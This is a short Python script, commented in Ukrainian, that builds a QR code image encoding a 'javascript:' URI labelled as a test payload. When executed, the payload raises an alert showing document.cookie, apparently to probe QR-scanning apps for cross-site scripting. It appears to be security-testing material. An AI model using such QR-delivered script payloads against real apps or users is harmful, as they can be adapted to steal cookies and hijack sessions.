import qrcode

# Тестовий payload для QR
payload = "javascript:alert('Test QR - document.domain: ' + document.cookie)"

# Створюємо QR-код
qr = qrcode.QRCode(
    version=1,  # розмір QR (1 = найменший)
    error_correction=qrcode.constants.ERROR_CORRECT_L,  # рівень корекції
    box_size=10,  # розмір кожного квадратика
    border=4,  # рамка
)
qr.add_data(payload)
qr.make(fit=True)

# Генеруємо зображення
img = qr.make_image(fill_color="black", back_color="white")

# Зберігаємо у файл
img.save("test_qr_xss.png")

print("✅ QR-код збережено у файл test_qr_xss.png")

